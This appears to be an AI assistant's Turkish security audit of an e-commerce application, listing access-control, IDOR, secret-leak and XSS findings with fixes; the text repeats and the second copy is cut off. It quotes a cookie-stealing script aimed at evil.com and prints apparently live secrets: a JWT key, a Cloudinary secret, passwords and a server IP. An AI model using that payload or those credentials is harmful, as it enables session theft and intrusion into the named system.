# Code Citations

## License: unknown
https://github.com/praveenjuge/praveenjuge/blob/f7c607592efe59257f18e3337868dd9519bec159/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
**Konum:** [CartServiceImpl.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/CartServiceImpl.java#L194-L203) → `calculateTotal()`

**Açıklama:**
`calculateTotal()` metodu sepet toplamını hesaplarken `couponService.applyCoupon()` çağırıyor. Bu metot, kuponun `usageCount`'unu **her çağrıda artırıyor**. Sipariş oluşturma akışında `calculateTotal()` çağrıldığında kupon kullanımı artıyor ama aslında sipariş henüz oluşmamış. Sepet her görüntülendiğinde kupon tükeniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// CartServiceImpl.calculateTotal()
public BigDecimal calculateTotal(Long userId) {
    Cart cart = getCartByUserId(userId);
    BigDecimal total = calculateRawTotal(cart);
    if (cart.getCouponCode() != null) {
        return couponService.applyCoupon(cart.getCouponCode(), total); // ❌ Her çağrıda usageCount++
    }
    return total;
}

// CouponServiceImpl.applyCoupon()
public BigDecimal applyCoupon(String code, BigDecimal cartTotal) {
    ...
    coupon.setUsageCount(coupon.getUsageCount() + 1); // ❌ Side effect
    couponRepository.save(coupon);
    ...
}
```

**İstismar Senaryosu:**
1. Saldırgan kupon uygulayıp sepet toplamını 500+ kez çağırarak kuponun kullanım limitini tüketir.
2. Meşru müşteriler kuponu kullanamaz.
3. Alternatif olarak `applyCoupon()` aynı anda iki kez çağrılırsa race condition ile limit aşılabilir (Coupon entity'de `@Version` var ama retry mekanizması yok).

**Etkisi:** Kupon manipülasyonu, iş mantığı ihlali, gelir kaybı.

**Önerilen Düzeltme:**
`calculateTotal()` içinde kupon indirimini **sadece hesapla, usage artırma**. Usage artırımını yalnızca `saveOrder()` akışında yap:
```java
// Yeni metot: sadece indirim hesabı, side-effect yok
public BigDecimal calculateDiscount(String code, BigDecimal cartTotal) {
    Coupon coupon = couponRepository.findByCode(code).orElseThrow(...);
    // Validate aktiflik, süre, limit... ama usageCount artırma
    return cartTotal.subtract(coupon.getDiscountAmount()).max(BigDecimal.ZERO);
}
```

---

### [C-05] Exception Handler'da Internal Bilgi Sızıntısı

**Seviye:** 🔴 KRİTİK
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java#L78-L83) → `handleGeneralException()`

**Açıklama:**
Catch-all exception handler'da `ex.getMessage()` doğrudan HTTP response'a yazılıyor. Beklenmeyen hatalar (NPE, JPA hataları, veritabanı bağlantı hataları vb.) durumunda internal class adları, SQL sorguları, stack trace parçaları ve tablo/kolon isimleri client'a sızar.

**Kanıt / Sorunlu Kod Akışı:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error(ex.getMessage(), HttpStatus.INTERNAL_SERVER_ERROR),  // ❌
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

**İstismar Senaryosu:**
Saldırgan, geçersiz girdi ile kasıtlı hatalar tetikler ve response'taki hata mesajlarından veritabanı şeması, tablo isimleri, framework detayları öğrenir; bu bilgiyi daha hedefli saldırılar için kullanır.

**Etkisi:** Bilgi sızıntısı, saldırı yüzeyinin genişlemesi.

**Önerilen Düzeltme:**
```java
@ExceptionHandler(Exception.class)
public ResponseEntity<Result> handleGeneralException(Exception ex) {
    log.error("Beklenmeyen hata oluştu: ", ex);
    return new ResponseEntity<>(
        ResultHelper.error("Beklenmeyen bir hata oluştu. Lütfen daha sonra tekrar deneyin.",
            HttpStatus.INTERNAL_SERVER_ERROR),
        HttpStatus.INTERNAL_SERVER_ERROR);
}
```

---

### [H-01] Havale Bildirimi Endpoint'inde Authentication ve Validation Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestBankTransferControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestBankTransferControllerImpl.java#L49-L52) → `submitTransfer()`

**Açıklama:**
`POST /v1/bank-transfers` endpoint'i SecurityConfig'de `permitAll()` olarak tanımlı. Kimlik doğrulaması olmadan herhangi biri sahte havale bildirimi gönderebilir. `toEntity()` metodu request'ten gelen `orderId`, `amount`, `bankName`, `senderName` gibi alanları doğrudan entity'ye yazıyor; sipariş sahipliği veya tutarın doğruluğu kontrolü yapılmıyor.

**İstismar Senaryosu:**
Saldırgan başka birinin siparişi için sahte havale bildirimi gönderir. Admin bunu onaylarsa sipariş durumu otomatik olarak PAID'e güncellenir.

**Etkisi:** Ödeme sahteciliği, sipariş manipülasyonu.

**Önerilen Düzeltme:**
1. Endpoint'i authenticated yapın veya honeypot olarak bırakırsanız admin tarafında güçlü doğrulama ekleyin.
2. `submitTransfer()` içinde orderId'nin gerçekten mevcut ve PENDING durumda olduğunu, tutarın sipariş tutarıyla eşleştiğini kontrol edin.

---

### [H-02] Dosya Yükleme'de Content-Type Spoofing Riski

**Seviye:** 🟠 YÜKSEK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Orta
**Konum:** [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java#L65-L72) → `validateImage()`

**Açıklama:**
Dosya yükleme doğrulaması yalnızca `file.getContentType()` değerine bakıyor. Bu değer istemci tarafından kolaylıkla ayarlanabilir. Dosyanın gerçek içeriğini (magic bytes) doğrulamak için herhangi bir kontrol yok. Ayrıca dosya uzantısı üzerinde açık bir beyaz liste doğrulaması yapılmıyor — uzantı, orijinal dosya adından alınıp UUID'ye ekleniyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
private void validateImage(MultipartFile file) {
    String contentType = file.getContentType();  // ❌ İstemci kontrollü
    if (contentType == null || !ALLOWED_CONTENT_TYPES.contains(contentType.toLowerCase())) {
        throw new BadRequestException("Sadece resim dosyaları yüklenebilir...");
    }
}
```

**İstismar Senaryosu:**
Saldırgan `Content-Type: image/jpeg` header'ı ile bir HTML veya SVG dosyası yükler. Dosya sunucuda saklanır ve doğrudan erişilirse tarayıcıda çalıştırılabilir (XSS).

**Önerilen Düzeltme:**
```java
private void validateImage(MultipartFile file) {
    // 1. Content-type kontrolü (mevcut)
    // 2. Uzantı beyaz listesi
    String ext = getExtension(file.getOriginalFilename()).toLowerCase();
    if (!Set.of(".jpg",".jpeg",".png",".gif",".webp").contains(ext)) {
        throw new BadRequestException("Geçersiz dosya uzantısı.");
    }
    // 3. Magic bytes kontrolü
    byte[] header = new byte[8];
    try (var is = file.getInputStream()) {
        is.read(header);
    }
    if (!isValidImageMagicBytes(header)) {
        throw new BadRequestException("Dosya içeriği geçerli bir resim değil.");
    }
}
```

---

### [H-03] sortBy Parametresinde Whitelist Eksikliği

**Seviye:** 🟠 YÜKSEK
**OWASP:** A03:2021 — Injection
**Güven Düzeyi:** Orta
**Konum:** Çoklu controller dosyası: [RestProductControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestProductControllerImpl.java#L78), [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L55)

**Açıklama:**
Birçok endpoint'te `sortBy` parametresi kullanıcıdan alınıp doğrudan `Sort.by(sortBy)` ile kullanılıyor. Beyaz liste doğrulaması yok. Spring Data JPA, bilinmeyen property'lerde genellikle `PropertyReferenceException` fırlatır ve bu sayede SQL injection riski düşüktür. Ancak hata mesajları entity yapısını ve alan isimlerini ifşa eder, ayrıca bazı edge case'lerde persistence provider davranışı öngörülemez olabilir.

**Kanıt / Sorunlu Kod Akışı:**
```java
Sort sort = direction.equalsIgnoreCase("desc")
    ? Sort.by(sortBy).descending()  // sortBy = kullanıcı girdisi, whitelist YOK
    : Sort.by(sortBy).ascending();
```

**İstismar Senaryosu:**
`?sortBy=passwordHash` gibi bir istek gönderildiğinde, User entity'deki gizli alanlar üzerinden sıralama yapılabilir ve timing/response farklılıklarıyla alan değerleri çıkarılabilir (blind information disclosure).

**Önerilen Düzeltme:**
```java
private static final Set<String> ALLOWED_SORT_FIELDS = Set.of("id", "title", "price", "createdAt");

String safeSortBy = ALLOWED_SORT_FIELDS.contains(sortBy) ? sortBy : "id";
Sort sort = Sort.by(safeSortBy);
```

---

### [H-04] JWT Logout'ta Server-Side Token İptali Yok

**Seviye:** 🟠 YÜKSEK
**OWASP:** A07:2021 — Identification and Authentication Failures
**Güven Düzeyi:** Yüksek
**Konum:** [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx#L73-L77) → `logout()`, Backend'de logout endpoint yok

**Açıklama:**
Logout işlemi sadece frontend tarafında localStorage'dan token'ları temizliyor. Backend'de:
1. Access token blacklist mekanizması yok — token süresi dolana kadar (30 dk) geçerli kalır
2. Refresh token server-side olarak silinmiyor — saldırgan tarafından ele geçirilmişse kullanılabilir
3. Logout API endpoint'i hiç bulunmuyor

**İstismar Senaryosu:**
Token XSS veya ağ dinleme ile ele geçirilirse, kullanıcı çıkış yapsa bile saldırgan 30 dakika boyunca hesabı kullanmaya devam eder. Refresh token ile de yeni access token alabilir.

**Önerilen Düzeltme:**
```java
@PostMapping("/logout")
public ResultData<String> logout(Authentication authentication) {
    User user = (User) authentication.getPrincipal();
    refreshTokenService.deleteByUserId(user.getId());
    return ResultHelper.success("Çıkış yapıldı.");
}
```
Ayrıca access token için kısa ömür (mevcut 30dk uygun) ve Redis tabanlı blacklist düşünülebilir.

---

### [M-01] Stored XSS Riski — Blog İçeriği Sanitize Edilmeden Render Ediliyor

**Seviye:** 🟡 ORTA
**OWASP:** A03:2021 — Injection (XSS)
**Güven Düzeyi:** Orta
**Konum:** [blog/\[slug\]/page.tsx](can-antika-frontend/app/blog/[slug]/page.tsx#L192) → `dangerouslySetInnerHTML`

**Açıklama:**
Blog yazısının `content` alanı backend'den geldiği gibi `dangerouslySetInnerHTML` ile render ediliyor. Backend'de de blog post oluşturma/güncelleme sırasında HTML sanitizasyonu yapılmıyor. Blog yazıları admin tarafından oluşturulsa da, admin hesabı ele geçirilirse veya güvenilmeyen bir editör blog yazdığında, saklanan XSS mümkündür.

**İstismar Senaryosu:**
Ele geçirilmiş admin hesabı üzerinden blog yazısına `<script>document.location='https://evil.com/steal?c='+document.cookie</script>` enjekte edilir. Blogu ziyaret eden her kullanıcının JWT token'ı çalınır.

**Önerilen Düzeltme:**
Frontend'de DOMPurify gibi bir kütüphane ile HTML sanitize edin:
```tsx
import DOMPurify from 'dompurify';
dangerouslySetInnerHTML={{ __html: DOMPurify.sanitize(post.content) }}
```

---

### [M-02] Güvenlik Başlıkları (Security Headers) Eksik

**Seviye:** 🟡 ORTA
**OWASP:** A05:2021 — Security Misconfiguration
**Güven Düzeyi:** Yüksek
**Konum:** [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [next.config.mjs](can-antika-frontend/next.config.mjs)

**Açıklama:**
Ne backend ne de frontend'te güvenlik başlıkları yapılandırılmış. Eksik başlıklar:
- **Content-Security-Policy** — XSS mitigasyonu
- **X-Frame-Options / frame-ancestors** — Clickjacking koruması
- **Strict-Transport-Security (HSTS)** — HTTPS zorlama
- **X-Content-Type-Options: nosniff** — MIME sniffing koruması
- **Referrer-Policy** — Bilgi sızıntısı önleme
- **Permissions-Policy** — Tarayıcı özellik kısıtlama

**Önerilen Düzeltme (Backend):**
```java
http.headers(headers -> headers
    .contentSecurityPolicy(csp -> csp.policyDirectives("default-src 'self'; script-src 'self'"))
    .frameOptions(fo -> fo.deny())
    .httpStrictTransportSecurity(hsts -> hsts.maxAgeInSeconds(31536000).includeSubDomains(true))
    .contentTypeOptions(Customizer.withDefaults())
    .referrerPolicy(rp -> rp.policy(ReferrerPolicyHeaderWriter.ReferrerPolicy.STRICT_ORIGIN_WHEN_CROSS_ORIGIN))
);
```

**Önerilen Düzeltme (Frontend — next.config.mjs):**
```js
async headers() {
    return [{
        source: '/(.*)',
        headers: [
            { key: 'X-Frame-Options', value: 'DENY' },
            { key: 'X-Content-Type-Options', value: 'nosniff' },
            { key:
```


## License: unknown
https://github.com/praveenjuge/praveenjuge/blob/f7c607592efe59257f18e3337868dd9519bec159/next.config.js

```
Now I have enough data to compile the full report. Let me organize everything.

---

# 🛡️ CAN ANTİKA — Uçtan Uca Güvenlik Denetim Raporu

---

## 1. İncelenen Dosya/Kod Alanlarının Kısa Özeti

**Backend (Spring Boot 3.2.2 / Java 17):**
- Security Config: [SecurityConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/SecurityConfig.java), [WebMvcConfig.java](e-commerce/src/main/java/com/mehmetkerem/config/WebMvcConfig.java)
- JWT: [JwtService.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtService.java), [JwtAuthFilter.java](e-commerce/src/main/java/com/mehmetkerem/jwt/JwtAuthFilter.java)
- Auth: [AuthService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/AuthService.java), [RefreshTokenService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/RefreshTokenService.java)
- Tüm Controller impl (27 adet), Service impl (32 adet), Repository (28 adet), Entity/Model (30 adet), DTO (65 adet)
- Exception Handler: [GlobalExceptionHandler.java](e-commerce/src/main/java/com/mehmetkerem/handler/GlobalExceptionHandler.java)
- Rate Limiting: [RateLimitFilter.java](e-commerce/src/main/java/com/mehmetkerem/config/RateLimitFilter.java)
- File Upload: [FileSystemStorageService.java](e-commerce/src/main/java/com/mehmetkerem/service/impl/FileSystemStorageService.java), [RestFileUploadControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestFileUploadControllerImpl.java)
- Config: [application.properties](e-commerce/src/main/resources/application.properties), [docker-compose.yml](docker-compose.yml)

**Frontend (Next.js / React / TypeScript):**
- [api-client.ts](can-antika-frontend/lib/api-client.ts), [auth-context.tsx](can-antika-frontend/lib/auth-context.tsx), [next.config.mjs](can-antika-frontend/next.config.mjs)
- Blog sayfası (`dangerouslySetInnerHTML` kullanımı)

---

## 2. Yönetici Özeti

| Seviye | Bulgu Sayısı |
|--------|--------------|
| 🔴 KRİTİK | 5 |
| 🟠 YÜKSEK | 4 |
| 🟡 ORTA | 5 |
| 🔵 DÜŞÜK | 3 |

**Sistemin Genel Risk Seviyesi: YÜKSEK**

### En Acil 5 Aksiyon:
1. **Kupon (Coupon) endpoint'lerine yetkilendirme ekle** — Herhangi bir oturum açmış kullanıcı kupon oluşturabiliyor/silebiliyor
2. **Fatura PDF endpoint'ine ownership kontrolü ekle** — IDOR ile herkesin faturası indirilebilir
3. **docker-compose.yml ve repo'daki secret'ları temizle** — JWT secret, Cloudinary API secret, DB şifresi ve admin JWT token'ı açık halde
4. **Kupon kullanım sayacının her `calculateTotal` çağrısında artmasını düzelt** — Business logic hatası
5. **GlobalExceptionHandler'daki catch-all'da `ex.getMessage()` yerine genel mesaj dön** — Internal hata mesajları client'a sızıyor

---

## 3. Bulgular

---

### [C-01] Kupon Endpoint'lerinde Yetkilendirme Eksikliği (Broken Function-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestCouponControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestCouponControllerImpl.java#L25-L44) → `createCoupon()`, `deleteCoupon()`, `applyCoupon()`

**Açıklama:**
`POST /v1/coupons/create`, `POST /v1/coupons/apply` ve `DELETE /v1/coupons/{id}` endpoint'lerinde `@Secured` veya `@PreAuthorize` anotasyonu **yok**. SecurityConfig'de bu path'ler `/v1/admin/**` altında olmadığından, `.anyRequest().authenticated()` kuralına düşüyor — oturum açmış **herhangi bir kullanıcı** bu işlemleri yapabiliyor.

**Kanıt / Sorunlu Kod Akışı:**
```java
// RestCouponControllerImpl.java — @Secured anotasyonu YOK
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(@RequestBody CouponRequest request) {
    return ResultHelper.success(couponService.createCoupon(request));
}

@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(@PathVariable Long id) {
    couponService.deleteCoupon(id);
    return ResultHelper.success("Kupon silindi.");
}
```

**İstismar Senaryosu:**
Normal bir kullanıcı, kendine %100 indirimli bir kupon oluşturur ve sepetine uygular. Tüm ürünleri 0 TL'ye satın alır. Mevcut kuponları da silebilir.

**Etkisi:** Finansal kayıp, iş mantığı ihlali, veri bütünlüğü kaybı.

**Önerilen Düzeltme:**
```java
@Secured("ROLE_ADMIN")
@PostMapping("/create")
public ResultData<CouponResponse> createCoupon(...) { ... }

@Secured("ROLE_ADMIN")
@DeleteMapping("/{id}")
public ResultData<String> deleteCoupon(...) { ... }
```

---

### [C-02] Fatura PDF İndirme'de IDOR (Broken Object-Level Authorization)

**Seviye:** 🔴 KRİTİK
**OWASP:** A01:2021 — Broken Access Control
**Güven Düzeyi:** Yüksek
**Konum:** [RestOrderControllerImpl.java](e-commerce/src/main/java/com/mehmetkerem/controller/impl/RestOrderControllerImpl.java#L146-L155) → `downloadInvoicePdf()`

**Açıklama:**
`GET /v1/order/{orderId}/invoice/pdf` endpoint'inde **hiçbir yetkilendirme kontrolü yapılmıyor**. Aynı controller'daki `getOrderInvoice()` metodu doğru şekilde ownership kontrolü yaparken, PDF download metodu bu kontrolü **tamamen atlıyor**.

**Kanıt / Sorunlu Kod Akışı:**
```java
// ✅ JSON invoice — OwnerShip kontrolü VAR
@GetMapping("/{orderId}/invoice")
public ResultData<OrderInvoiceResponse> getOrderInvoice(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = ...;
    if (!isOwner && !isAdmin) throw ...;  // ✅ Doğru kontrol
}

// ❌ PDF invoice — Kontrol YOK
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);  // ❌ Direkt erişim
    return ResponseEntity.ok()...body(pdfBytes);
}
```

**İstismar Senaryosu:**
Saldırgan orderId'leri sırayla itereyerek (`/v1/order/1/invoice/pdf`, `/v1/order/2/invoice/pdf`, ...) tüm müşterilerin faturalarını (ad, adres, sipariş detayı) indirebilir.

**Etkisi:** Kişisel veri sızıntısı (PII), KVKK ihlali, müşteri bilgilerinin ifşası.

**Önerilen Düzeltme:**
```java
@GetMapping("/{orderId}/invoice/pdf")
public ResponseEntity<byte[]> downloadInvoicePdf(@PathVariable Long orderId) {
    Order order = orderService.getOrderById(orderId);
    Long currentUserId = SecurityUtils.getCurrentUserId();
    if (currentUserId == null) throw new InsufficientAuthenticationException("Oturum gerekli");
    boolean isOwner = order.getUserId().equals(currentUserId);
    boolean isAdmin = SecurityUtils.getCurrentUser() != null
            && SecurityUtils.getCurrentUser().getRole() == Role.ADMIN;
    if (!isOwner && !isAdmin) throw new BadRequestException("Bu faturayı indirme yetkiniz yok.");
    byte[] pdfBytes = invoicePdfService.generateInvoicePdf(orderId);
    return ResponseEntity.ok()...body(pdfBytes);
}
```

---

### [C-03] Repo'da Hardcoded Secret'lar ve Yayınlanmış JWT Token

**Seviye:** 🔴 KRİTİK
**OWASP:** A02:2021 — Cryptographic Failures
**Güven Düzeyi:** Yüksek
**Konum:**
- [docker-compose.yml](docker-compose.yml#L47-L51)
- [application.properties](e-commerce/src/main/resources/application.properties#L32)
- [token.json](e-commerce/token.json)
- [api-client.ts](can-antika-frontend/lib/api-client.ts#L3-L4)

**Açıklama:**
Birden fazla hassas veri repo'ya commit'lenmiş durumda:

| Veri | Dosya | Değer |
|------|-------|-------|
| JWT Secret | docker-compose.yml | `b3c7f2e8a91d4f5069c8e12a7b6d3f4e5a9c1d0872e4f6a8b3c5d7e9f0a1b2c3` |
| Cloudinary API Secret | docker-compose.yml | `dnR2_CjaiLKnxjhw64vJpaSjYqE` |
| DB Password (default) | application.properties | `mehmet619` |
| Admin Password (default) | application.properties | `admin123` |
| Admin JWT Token | token.json | Tam bearer token |
| Sunucu IP'si | api-client.ts | `http://116.202.106.185:8085` |

**İstismar Senaryosu:**
Repo'ya erişimi olan (veya geçmişte erişimi olan) herhangi biri JWT secret ile sahte admin token'ları üretebilir, Cloudinary hesabını kötüye kullanabilir veya doğrudan veritabanına bağlanabilir.

**Etkisi:** Tam sistem ele geçirme, veri ihlali.

**Önerilen Düzeltme:**
1. Tüm secret'ları environment variable olarak dışarıdan verin
2. `docker-compose.yml`'de `.env` dosyası referans edin
3. `token.json` dosyasını silin ve `.gitignore`'a ekleyin
4. Mevcut JWT secret'ı ve Cloudinary secret'ı **hemen** rotate edin
5. Git geçmişini `git filter-branch` veya `BFG` ile temizleyin

---

### [C-04] Kupon Kullanım Sayacı Business Logic Hatası (Double-Spend)

**Seviye:** 🔴 KRİTİK
**OWASP:** A04:2021 — Insecure Design
**Güven Düzeyi:** Yüksek
